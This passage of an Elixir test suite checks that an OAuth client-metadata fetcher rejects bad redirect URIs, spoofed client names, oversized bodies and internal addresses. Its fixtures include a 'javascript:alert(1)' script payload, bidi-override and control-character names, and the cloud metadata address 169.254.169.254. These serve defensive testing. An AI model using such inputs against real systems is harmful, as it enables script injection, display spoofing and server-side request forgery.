        assert {:ok, %{"redirect_uris" => [^uri]}} = OAuth.fetch_client_metadata(@client_id)
      end
    end

    test "rejects an over-long redirect_uri" do
      uri = "https://client.example.com/" <> String.duplicate("a", 2049 - 27)
      assert byte_size(uri) == 2049

      stub_metadata(%{"client_id" => @client_id, "redirect_uris" => [uri]})

      assert {:error, :invalid_redirect_uris} = OAuth.fetch_client_metadata(@client_id)
    end

    test "rejects the whole document when any one redirect_uri is unusable" do
      stub_metadata(%{
        "client_id" => @client_id,
        "redirect_uris" => [@redirect_uri, "javascript:alert(1)"]
      })

      assert {:error, :invalid_redirect_uris} = OAuth.fetch_client_metadata(@client_id)
    end

    test "rejects a document with an unusable client_name" do
      for name <- [
            String.duplicate("N", 256),
            42,
            %{"en" => "Client"},
            # `"" || client_id` is `""`, so a blank name blanks the consent
            # screen's identity line instead of falling back to the client_id.
            "",
            "   ",
            "\t\n",
            # Controls truncate or garble the line.
            "Claude\u0000 Code",
            "Claude\nCode",
            "Claude\u007FCode",
            "Claude\u009BCode",
            # Bidi overrides and isolates reorder the glyphs around them.
            "Claude\u202ECode",
            "Claude\u202ACode",
            "Claude\u2066Code",
            "Claude\u2069Code"
          ] do
        stub_metadata(%{
          "client_id" => @client_id,
          "redirect_uris" => [@redirect_uri],
          "client_name" => name
        })

        assert {:error, :invalid_client_name} = OAuth.fetch_client_metadata(@client_id)
      end
    end

    test "accepts a client_name with non-ASCII text and internal spaces" do
      for name <- ["Claude Code", "Café Ausw\u00E4rts", "分析クライアント", "Zoë's Client"] do
        stub_metadata(%{
          "client_id" => @client_id,
          "redirect_uris" => [@redirect_uri],
          "client_name" => name
        })

        assert {:ok, %{"client_name" => ^name}} = OAuth.fetch_client_metadata(@client_id)
      end
    end

    test "accepts a document with no client_name" do
      stub_metadata(%{"client_id" => @client_id, "redirect_uris" => [@redirect_uri]})

      assert {:ok, doc} = OAuth.fetch_client_metadata(@client_id)
      refute Map.has_key?(doc, "client_name")
    end

    test "rejects a malformed document" do
      stub_body("not json")
      assert {:error, :invalid_client_metadata} = OAuth.fetch_client_metadata(@client_id)
    end

    test "rejects a non-200 response" do
      stub_body("", 404)
      assert {:error, :client_metadata_unavailable} = OAuth.fetch_client_metadata(@client_id)
    end

    test "refuses to buffer an oversized document" do
      stub_body(String.duplicate("a", 1_000_001))
      assert {:error, :client_metadata_too_large} = OAuth.fetch_client_metadata(@client_id)
    end

    test "propagates a DNS resolution failure" do
      stub_dns(%{"client.example.com" => {[], []}})
      assert {:error, :dns_resolution_failed} = OAuth.fetch_client_metadata(@client_id)
    end

    test "refuses a client_id resolving to a restricted address, without fetching it" do
      stub_dns(%{"client.example.com" => {[{169, 254, 169, 254}], []}})

      Req.Test.stub(Plausible.OAuth, fn _conn ->
        raise "should never be called"
      end)

      assert {:error, :restricted_address} = OAuth.fetch_client_metadata(@client_id)
    end
  end
end
